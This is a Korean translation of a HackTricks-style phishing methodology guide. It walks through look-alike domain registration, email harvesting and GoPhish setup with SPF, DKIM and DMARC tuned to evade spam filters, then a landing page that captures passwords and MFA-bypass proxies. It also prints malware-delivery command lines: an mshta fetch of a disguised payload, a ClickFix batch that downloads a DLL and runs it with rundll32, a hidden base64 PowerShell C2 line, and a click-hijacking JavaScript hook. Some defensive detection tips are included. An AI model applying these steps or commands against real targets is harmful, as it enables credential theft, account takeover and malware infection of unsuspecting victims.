# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 피해자 정찰
   1. **피해자 도메인**을 선택합니다.
   2. 기본적인 웹 열거를 수행해 피해자가 사용하는 **로그인 포털을 검색**하고, 어떤 포털을 **사칭할지 결정**합니다.
   3. **OSINT**를 활용해 **이메일 주소를 찾습니다**.
2. 환경 준비
   1. 피싱 평가에 사용할 **도메인을 구매**합니다.
   2. 이메일 서비스 관련 레코드(SPF, DMARC, DKIM, rDNS)를 **구성**합니다.
   3. VPS에 **gophish**를 구성합니다.
3. 캠페인 준비
   1. **이메일 템플릿**을 준비합니다.
   2. 자격 증명을 탈취할 **웹 페이지**를 준비합니다.
4. 캠페인을 시작합니다!

## 유사한 도메인 이름 생성 또는 신뢰할 수 있는 도메인 구매

### 도메인 이름 변형 기법

- **키워드**: 도메인 이름에 원래 도메인의 중요한 **키워드가 포함**됩니다(예: zelster.com-management.com).<sup>[[1]](#references)</sup>
- **하이픈이 있는 하위 도메인**: 하위 도메인의 **점(dot)을 하이픈으로 변경**합니다(예: www-zelster.com).
- **새 TLD**: 같은 도메인에 **새 TLD**를 사용합니다(예: zelster.org).
- **Homoglyph**: 도메인 이름의 글자를 **비슷하게 생긴 글자**로 **바꿉니다**(예: zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **전치:** 도메인 이름에서 **두 글자의 순서를 바꿉니다**(예: zelsetr.com).
- **단수화/복수화**: 도메인 이름 끝에 “s”를 추가하거나 제거합니다(예: zeltsers.com).
- **생략**: 도메인 이름에서 글자 하나를 **제거합니다**(예: zelser.com).
- **반복:** 도메인 이름의 글자 하나를 **반복합니다**(예: zeltsser.com).
- **대체**: Homoglyph와 유사하지만 은폐성이 더 낮습니다. 도메인 이름의 글자 하나를 다른 글자로 바꿉니다. 키보드에서 원래 글자와 가까운 글자를 사용할 수도 있습니다(예: zektser.com).
- **하위 도메인 삽입**: 도메인 이름 안에 **점(dot)**을 넣습니다(예: ze.lster.com).
- **삽입**: 도메인 이름에 글자 하나를 **삽입합니다**(예: zerltser.com).
- **점 누락**: TLD를 도메인 이름에 붙입니다(예: zelstercom.com).

**자동화 도구**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**웹사이트**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

태양 플레어, 우주선, 하드웨어 오류 등 다양한 요인으로 인해 저장되거나 통신 중인 비트 일부가 자동으로 뒤집힐 **가능성이 있습니다**.

이 개념을 **DNS 요청에 적용하면**, DNS 서버가 받은 **도메인이 처음 요청한 도메인과 달라질 수 있습니다**.

예를 들어 도메인 "windows.com"의 비트 하나가 변경되면 "windnws.com"으로 바뀔 수 있습니다.

공격자는 피해자의 도메인과 비슷한 여러 bit-flipping 도메인을 등록해 이를 **악용할 수 있습니다**. 공격자는 정상적인 사용자를 자신의 인프라로 리디렉션하려고 합니다.

자세한 내용은 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)을 참조하세요.<sup>[[10]](#references)[[11]](#references)</sup>

### 신뢰할 수 있는 도메인 구매

[https://www.expireddomains.net/](https://www.expireddomains.net)에서 사용할 수 있는 만료된 도메인을 검색할 수 있습니다.\
구매하려는 만료된 도메인이 **이미 좋은 SEO를 갖추고 있는지** 확인하려면 다음 사이트에서 해당 도메인의 분류를 검색할 수 있습니다.

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 이메일 주소 찾기

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% 무료)
- [https://phonebook.cz/](https://phonebook.cz) (100% 무료)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

유효한 이메일 주소를 **더 많이 찾거나**, 이미 찾은 주소를 **검증**하려면 피해자의 SMTP 서버에서 해당 주소를 무차별 대입할 수 있는지 확인할 수 있습니다. [여기에서 이메일 주소를 검증/찾는 방법을 알아보세요](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
또한 사용자가 메일에 액세스하기 위해 **웹 포털을 사용하는 경우**, 해당 포털이 **사용자 이름 무차별 대입 공격**에 취약한지 확인하고, 가능하면 취약점을 악용하는 것도 잊지 마세요.

## GoPhish 구성

### 설치

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)에서 다운로드할 수 있습니다.

파일을 다운로드해 압축을 `/opt/gophish` 안에 풀고 `/opt/gophish/gophish`를 실행합니다.\
출력에 포트 3333의 admin 사용자 비밀번호가 표시됩니다. 해당 포트에 접속해 제공된 자격 증명을 사용하여 admin 비밀번호를 변경하세요. 해당 포트를 로컬로 터널링해야 할 수도 있습니다.

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Configuration

**TLS certificate configuration**

이 단계를 진행하기 전에 사용할 **도메인을 이미 구매했어야 하며**, 해당 도메인이 **gophish**를 설정하는 **VPS의 IP를 가리키도록 설정되어 있어야 합니다**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**메일 구성**

설치를 시작합니다: `apt-get install postfix`

그런 다음 다음 파일에 도메인을 추가합니다.

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** 파일에서 다음 변수 값도 변경합니다.

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

마지막으로 **`/etc/hostname`** 및 **`/etc/mailname`** 파일을 도메인 이름으로 수정한 다음 **VPS를 재시작합니다.**

이제 VPS의 **IP 주소**를 가리키는 `mail.<domain>`의 **DNS A 레코드**를 만들고, `mail.<domain>`을 가리키는 **DNS MX 레코드**를 만듭니다.

이제 이메일 전송을 테스트해 보겠습니다.

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish 구성**

gophish 실행을 중지하고 구성합니다.\
`/opt/gophish/config.json`을 다음과 같이 수정합니다(https 사용에 유의하세요):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**gophish 서비스 구성**

gophish 서비스를 생성해 자동으로 시작하고 서비스로 관리하려면 다음 내용을 포함하는 `/etc/init.d/gophish` 파일을 만들면 됩니다:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

다음을 수행하여 서비스를 구성하고 확인합니다:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## 메일 서버 및 도메인 구성

### 기다리고 합법적으로 보이기

도메인을 오래 보유할수록 스팸으로 감지될 가능성이 낮아집니다. 따라서 피싱 평가를 진행하기 전에 가능한 한 오래 기다려야 합니다(최소 1주일). 또한 평판이 좋은 업종에 관한 페이지를 게시하면 더 나은 평판을 얻을 수 있습니다.

일주일을 기다려야 하더라도 지금 모든 설정을 마칠 수 있습니다.

### Reverse DNS (rDNS) 레코드 구성

VPS의 IP 주소가 도메인 이름으로 확인되도록 rDNS (PTR) 레코드를 설정합니다.

### Sender Policy Framework (SPF) 레코드

**새 도메인에 SPF 레코드를 설정해야 합니다.** SPF 레코드가 무엇인지 모른다면 [**이 페이지를 읽어 보세요**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

[https://www.spfwizard.net/](https://www.spfwizard.net)를 사용해 SPF 정책을 생성할 수 있습니다(VPS 서버의 IP를 사용하세요).

![피싱 도메인의 SPF 레코드를 생성하기 위한 SPF Wizard 양식](<../../images/image (1037).png>)

도메인의 TXT 레코드에 설정해야 하는 내용은 다음과 같습니다:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### 도메인 기반 메시지 인증, 보고 및 준수(DMARC) 레코드

**새 도메인에 DMARC 레코드를 설정해야 합니다.** DMARC 레코드가 무엇인지 모른다면 [**이 페이지를 읽어 보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

호스트 이름이 `_dmarc.<domain>`인 새 DNS TXT 레코드를 만들고, 다음 내용을 입력해야 합니다:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

새 도메인에 **DKIM을 설정해야 합니다**. DKIM 레코드가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

이 튜토리얼은 다음을 기반으로 합니다: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM 키가 생성하는 두 B64 값을 연결해야 합니다:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 이메일 설정 점수 테스트

[https://www.mail-tester.com/](https://www.mail-tester.com)을 사용하면 됩니다\
페이지에 접속한 뒤 안내된 주소로 이메일을 보내세요:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

이메일을 `check-auth@verifier.port25.com`으로 보내고 **응답을 읽어 이메일 설정을 확인할 수도 있습니다**(이 경우 포트 **25**를 열고, root로 이메일을 보내면 파일 _/var/mail/root_에서 응답을 확인해야 합니다).\
모든 테스트를 통과하는지 확인하세요:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

**제어할 수 있는 Gmail로 메시지**를 보내고, Gmail 받은편지함에서 **이메일 헤더**를 확인할 수도 있습니다. `Authentication-Results` 헤더 필드에 `dkim=pass`가 표시되어야 합니다.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Spamhouse 블랙리스트에서 제거하기

[www.mail-tester.com](https://www.mail-tester.com) 페이지에서 도메인이 spamhouse에 의해 차단되었는지 확인할 수 있습니다. 다음에서 도메인/IP 제거를 요청할 수 있습니다: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft 블랙리스트에서 제거하기

​​[https://sender.office.com/](https://sender.office.com)에서 도메인/IP 제거를 요청할 수 있습니다.

## GoPhish 캠페인 생성 및 실행

### Sending Profile

- 발신자 프로필을 **식별할 이름**을 지정합니다
- 피싱 이메일을 보낼 계정을 선택합니다. 제안: _noreply, support, servicedesk, salesforce..._
- 사용자 이름과 비밀번호는 비워 두어도 되지만, Ignore Certificate Errors를 선택했는지 확인합니다

![GoPhish 캠페인 생성 및 실행 - Sending Profile: 사용자 이름과 비밀번호는 비워 두어도 되지만, Ignore Certificate Errors를 선택했는지 확인합니다](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 모든 기능이 제대로 작동하는지 확인하려면 "**Send Test Email**" 기능을 사용하는 것이 좋습니다.\
> 테스트 도중 블랙리스트에 오르는 일을 방지하려면 **테스트 이메일을 10min 메일 주소로 보내는 것**을 권장합니다.

### Email Template

- 템플릿을 **식별할 이름**을 지정합니다
- 그런 다음 **제목**을 작성합니다 (특이한 내용은 피하고, 일반 이메일에서 읽을 법한 내용을 작성합니다)
- "**Add Tracking Image**"가 선택되어 있는지 확인합니다
- **이메일 템플릿**을 작성합니다 (다음 예시처럼 변수를 사용할 수 있습니다):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

참고로 **이메일의 신뢰도를 높이려면**, 클라이언트가 보낸 이메일에서 서명을 가져와 사용하는 것이 좋습니다. 다음을 참고하세요.

- **존재하지 않는 주소**로 이메일을 보내고 회신에 서명이 있는지 확인합니다.
- info@ex.com, press@ex.com 또는 public@ex.com처럼 **공개된 이메일 주소**를 찾아 이메일을 보낸 뒤 회신을 기다립니다.
- **유효한 것으로 확인된** 이메일 주소로 연락해 회신을 기다립니다.

![Sending Profile - Email Template: 유효한 것으로 확인된 이메일 주소로 연락해 회신을 기다립니다](<../../images/image (80).png>)

> [!TIP]
> Email Template에서 **보낼 파일을 첨부**할 수도 있습니다. 특수하게 조작한 파일/문서를 사용해 NTLM challenge도 탈취하려면 [이 페이지를 읽어 보세요](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- **이름**을 작성합니다.
- 웹 페이지의 **HTML 코드를 작성**합니다. 웹 페이지를 **가져올** 수도 있습니다.
- **Capture Submitted Data**와 **Capture Passwords**를 선택합니다.
- **리디렉션**을 설정합니다.

![Email Template - Landing Page: Capture Submitted Data와 Capture Passwords 선택](<../../images/image (826).png>)

> [!TIP]
> 보통은 페이지의 HTML 코드를 수정하고 로컬에서 (Apache 서버 등을 사용해) 몇 가지 테스트를 **원하는 결과가 나올 때까지** 해야 합니다. 그런 다음 HTML 코드를 입력란에 작성합니다.\
> HTML에서 **정적 리소스**(CSS 및 JS 페이지 등)를 사용해야 한다면 _**/opt/gophish/static/endpoint**_에 저장한 뒤 _**/static/\<filename>**_에서 불러올 수 있습니다.

> [!TIP]
> 리디렉션은 **피해자의 실제 메인 웹 페이지**로 설정하거나, 예를 들어 /static/migration.html로 설정할 수 있습니다. 여기에 **회전하는 로딩 휠**([**https://loading.io/**](https://loading.io))을 5초간 표시한 뒤 **프로세스가 성공적으로 완료되었다고 안내**할 수도 있습니다.

### Users & Groups

- 이름을 설정합니다.
- **데이터를 가져옵니다**(예제의 템플릿을 사용하려면 각 사용자의 이름, 성, 이메일 주소가 필요합니다).

![Landing Page - Users & Groups: 데이터 가져오기(예제의 템플릿을 사용하려면 각 사용자의 이름, 성, 이메일 주소가 필요합니다)](<../../images/image (163).png>)

### Campaign

마지막으로 이름, 이메일 템플릿, 랜딩 페이지, URL, 발신 프로필, 그룹을 선택해 campaign을 만듭니다. URL은 피해자에게 전송될 링크입니다.

**Sending Profile을 사용하면 테스트 이메일을 보내 최종 phishing 이메일이 어떻게 보이는지 확인할 수 있습니다**.

![Users & Groups - Campaign: Sending Profile을 사용하면 테스트 이메일을 보내 최종 phishing 이메일이 어떻게 보이는지 확인할 수 있습니다](<../../images/image (192).png>)

모든 준비가 끝나면 campaign을 시작하면 됩니다!

## Website Cloning

어떤 이유로든 웹사이트를 복제하고 싶다면 다음 페이지를 참고하세요:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

일부 phishing 평가(주로 Red Team 평가)에서는 **일종의 backdoor가 포함된 파일**(C2이거나 단순히 인증을 유발하는 것)을 보내고 싶을 수도 있습니다.\
예시는 다음 페이지에서 확인하세요:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

앞서 살펴본 공격은 실제 웹사이트를 가장하고 사용자가 입력한 정보를 수집하므로 상당히 영리합니다. 안타깝게도 사용자가 올바른 비밀번호를 입력하지 않았거나 가장한 애플리케이션에 2FA가 설정되어 있다면 **이 정보만으로는 속아 넘어간 사용자를 사칭할 수 없습니다**.

이럴 때 [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper), [**muraena**](https://github.com/muraenateam/muraena) 같은 도구가 유용합니다. 이 도구를 사용하면 MitM과 유사한 공격을 수행할 수 있습니다. 기본적인 공격 방식은 다음과 같습니다.

1. 실제 웹 페이지의 로그인 양식을 **사칭**합니다.
2. 사용자가 가짜 페이지에 **자격 증명**을 **보내면**, 도구가 이를 실제 웹 페이지로 전달해 **자격 증명이 유효한지 확인**합니다.
3. 계정에 **2FA**가 설정되어 있으면 MitM 페이지가 2FA 코드를 요청하고, **사용자가 입력하면** 도구가 이를 실제 웹 페이지로 전달합니다.
4. 사용자가 인증되면, 공격자인 당신은 MitM을 수행하는 동안의 모든 상호작용에서 **자격 증명, 2FA, cookie 및 기타 모든 정보**를 수집하게 됩니다.

### Via VNC

**피해자를 원본과 똑같이 보이는 악성 페이지로 보내는** 대신, 실제 웹 페이지에 연결된 브라우저가 있는 **VNC 세션으로 보내면** 어떨까요? 사용자의 행동을 보고, 비밀번호와 사용된 MFA, cookie 등을 탈취할 수 있습니다.\
[**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)를 사용하면 됩니다.<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

들켰는지 확인하는 가장 좋은 방법 중 하나는 **blacklist에서 자신의 도메인을 검색하는 것**입니다. 목록에 있다면 어떤 방식으로든 도메인이 의심스러운 것으로 탐지된 것입니다.\
도메인이 blacklist에 있는지 확인하는 간단한 방법은 [https://malwareworld.com/](https://malwareworld.com)을 이용하는 것입니다.

하지만 다음에 설명된 것처럼 피해자가 **외부에서 의심스러운 phishing 활동을 적극적으로 찾고 있는지** 알아보는 다른 방법도 있습니다.


{{#ref}}
detecting-phising.md
{{#endref}}

피해자의 도메인과 이름이 매우 비슷한 도메인을 **구매하거나**, 자신이 관리하는 도메인의 **하위 도메인**에 피해자의 도메인 **키워드가 포함된 인증서를 생성**할 수 있습니다. **피해자**가 해당 도메인과 **DNS 또는 HTTP 상호작용**을 하면, 의심스러운 도메인을 **적극적으로 찾고 있다는 사실**을 알 수 있으므로 매우 은밀하게 행동해야 합니다.<sup>[[2]](#references)</sup>

### Evaluate the phishing

[**Phishious** ](https://github.com/Rices/Phishious)를 사용하면 이메일이 spam 폴더로 들어갈지, 차단될지, 아니면 성공적으로 전달될지 평가할 수 있습니다.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

최근의 침입 그룹은 MFA를 우회하기 위해 이메일 유인책을 완전히 건너뛰고 **서비스 데스크/ID 복구 절차를 직접 노리는 경우가 늘고 있습니다**. 이 공격은 완전히 "living-off-the-land" 방식입니다. 유효한 자격 증명을 확보한 뒤 운영자는 기본 제공 관리자 도구를 사용해 이동하며, malware가 필요하지 않습니다.<sup>[[6]](#references)</sup>

### Attack flow
1. 피해자를 정찰합니다.
   * LinkedIn, 데이터 유출, 공개 GitHub 등에서 개인 및 기업 정보를 수집합니다.
   * 중요도가 높은 ID(임원, IT, 재무)를 식별하고 비밀번호/MFA 재설정에 필요한 **정확한 서비스 데스크 절차**를 파악합니다.
2. 실시간 social engineering
   * 대상 사용자를 사칭해 서비스 데스크에 전화하거나 Teams 또는 chat으로 연락합니다(종종 **발신자 ID를 spoofing**하거나 **음성을 복제**함).
   * 사전에 수집한 PII를 제공해 지식 기반 인증을 통과합니다.
   * 담당자를 설득해 **MFA secret을 재설정**하거나 등록된 휴대전화 번호를 **SIM-swap**하도록 합니다.
3. 액세스 직후 수행하는 작업(실제 사례에서는 60분 이내)
   * 웹 SSO 포털을 통해 foothold를 확보합니다.
   * 바이너리를 업로드하지 않고 기본 제공 도구로 AD/AzureAD를 열거합니다:
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * 환경에서 이미 허용 목록에 등록된 **WMI**, **PsExec** 또는 합법적인 **RMM** 에이전트를 이용한 lateral movement.

### 탐지 및 완화
* 헬프데스크의 계정 복구를 **권한 작업**으로 취급하고, 추가 인증 및 관리자 승인을 요구합니다.
* 다음 상황에 경고를 보내도록 **Identity Threat Detection & Response (ITDR)** / **UEBA** 규칙을 배포합니다:  
  * MFA 방식이 변경된 뒤 새 기기 / 지역에서 인증이 발생하는 경우.  
  * 동일한 주체가 즉시 권한을 승격하는 경우(user-→-admin).  
* 헬프데스크 통화를 녹음하고, 재설정 전에 **이미 등록된 번호로 콜백**하도록 강제합니다.
* **Just-In-Time (JIT) / Privileged Access**를 구현해 재설정된 계정이 높은 권한의 토큰을 자동으로 상속하지 않도록 합니다.

---

## 대규모 기만 – SEO Poisoning 및 “ClickFix” 캠페인
일반적인 공격 조직은 대규모 공격을 통해 고접촉형 작전의 비용을 상쇄하며, 이때 **검색 엔진과 광고 네트워크를 공격 전달 경로로 활용**합니다.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising**은 `chromium-update[.]site`와 같은 가짜 검색 결과를 검색 광고 상단에 노출합니다.
2. 피해자는 소형 **1단계 로더**(주로 JS/HTA/ISO)를 다운로드합니다. Unit 42가 확인한 예:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. 로더는 브라우저 쿠키와 자격 증명 DB를 유출한 다음, *실시간으로* 배포 대상을 결정하는 **스텔스 로더**를 가져옵니다:
   * RAT (예: AsyncRAT, RustDesk)
   * 랜섬웨어 / 와이퍼
   * 지속성 구성 요소 (레지스트리 Run 키 + 예약 작업)

### 보안 강화 팁
* 신규 등록 도메인을 차단하고, 이메일뿐 아니라 *검색 광고*에도 **Advanced DNS / URL Filtering**을 적용합니다.
* 소프트웨어 설치를 서명된 MSI / Store 패키지로 제한하고, 정책으로 `HTA`, `ISO`, `VBS` 실행을 거부합니다.
* 브라우저의 자식 프로세스가 설치 프로그램을 여는지 모니터링합니다:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* First-stage loader가 자주 악용하는 LOLBins를 찾습니다(예: `regsvr32`, `curl`, `mshta`).

### TDS 핸드오프를 이용한 다운로드 버튼 클릭 하이재킹
일부 가짜 소프트웨어 포털은 화면에 표시되는 다운로드 `href`가 **실제** GitHub/release URL을 가리키도록 유지하지만, JavaScript로 사용자의 **첫 번째** 상호작용을 하이재킹해 피해자를 대신 **Traffic Distribution System (TDS)** 체인으로 보냅니다.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

주요 특징:
- 훅은 보통 `document`의 **capture phase** (`true`)에서 실행되므로 사이트 핸들러보다 먼저 동작합니다.
- Chrome은 리디렉션을 유효한 **user gesture**에 연결하고 popup blocker 우회를 개선하기 위해 `click` 대신 `mousedown`을 사용하는 경우가 많습니다.
- 일부 변형은 `about:blank`를 미리 열거나 `<a target="_blank">` 클릭을 합성한 뒤, 나중에 TDS URL을 설정합니다.
- 브라우저 측 제한은 흔히 `localStorage`에 저장되므로, **첫 클릭**은 malware로 연결되고 새로고침하거나 재시도하면 정상적으로 보이는 링크로 연결될 수 있습니다.
- TDS는 referrer, 진입 도메인, GEO, 브라우저/기기 fingerprint, VPN/datacenter 검사, 클릭 컨텍스트, 세션별 카운터를 기준으로 필터링할 수 있어 분석가의 재현 결과가 일관되지 않을 수 있습니다.

방어 아이디어:
- **표시된** `href`와 클릭 시 생성되는 **실제** 이동 대상을 비교합니다.
- `window.open`, `about:blank` 또는 합성 앵커 클릭과 관련해 `preventDefault()`와 `stopImmediatePropagation()`을 모두 호출하는 `document.addEventListener(..., true)` 핸들러를 탐색합니다.
- 동일한 CloudFront/JS stage를 불러오는 신규 소프트웨어 다운로드 도메인 군집은 SEO poisoning/TDS 패턴을 강하게 시사하는 신호로 간주합니다.

### 가짜 인증 페이지의 ClickFix + 아카이브처럼 보이는 LOLBAS fetch
일부 TDS 분기는 가짜 인증 페이지(Cloudflare/IUAM 스타일)로 연결되어 피해자에게 다음과 같은 신뢰할 수 있는 Windows 바이너리를 실행하도록 안내합니다:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notes:
- `mshta.exe`는 URL이 `.7z` archive인 것처럼 위장하더라도 **응답 시작 부분의 HTA/VBScript를 실행**합니다. 뒤에 덧붙인 archive 데이터는 순수한 미끼일 수 있습니다.
- 후속 stage에서는 파일 형식을 계속 속이는 경우가 많습니다(PowerShell에는 `.rtf`, Python에는 `.asar`, 패딩된 바이너리가 포함된 ZIP 사용). 이후 **manual PE mapping / in-memory execution**으로 전환합니다.
- 이러한 chain에 대응하는 경우, 첫 번째 성공적인 실행부터 **network + memory를 보존**하세요. 이후 replay에서는 무해한 installer/SFX 경로만 나타나거나, payload/key release가 원래 TDS session에 연결되어 있어 실패할 수 있습니다.

### ClickFix DLL 전달 기법 (가짜 CERT 업데이트)
* 미끼: **Update** 버튼을 눌러 단계별 “수정” 지침을 표시하는 국가 CERT 권고문 복제본. 피해자에게 DLL을 다운로드하고 `rundll32`로 실행하는 batch를 실행하라고 안내합니다.<sup>[[12]](#references)</sup>
* 관찰된 일반적인 batch chain:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest`는 페이로드를 `%TEMP%`에 저장하고, 짧은 sleep으로 네트워크 지터를 숨긴 다음 `rundll32`가 내보낸 진입점(`notepad`)을 호출합니다.
* DLL은 호스트 식별 정보를 비콘으로 전송하고 몇 분마다 C2를 폴링합니다. 원격 tasking은 숨김 상태에서 정책 우회를 적용해 실행되는 **base64로 인코딩된 PowerShell**로 전달됩니다:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * 이는 C2 유연성을 유지하고(서버가 DLL을 업데이트하지 않고도 작업을 바꿀 수 있음) 콘솔 창을 숨깁니다. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`을 함께 사용하는 `rundll32.exe`의 PowerShell 자식 프로세스를 탐지하세요.
* 방어자는 `...page.php?tynor=<COMPUTER>sss<USER>` 형식의 HTTP(S) 콜백과 DLL 로드 후 5분 간격의 폴링을 찾아볼 수 있습니다.

---

## AI 강화 피싱 작전
공격자는 이제 **LLM 및 voice-clone API**를 연계해 완전히 개인화된 미끼를 만들고 실시간으로 상호작용합니다.

| 계층 | 위협 행위자의 활용 사례 |
|-------|-----------------------------|
|자동화|무작위 문구와 추적 링크를 사용해 이메일/SMS를 10만 건 이상 생성 및 발송합니다.|
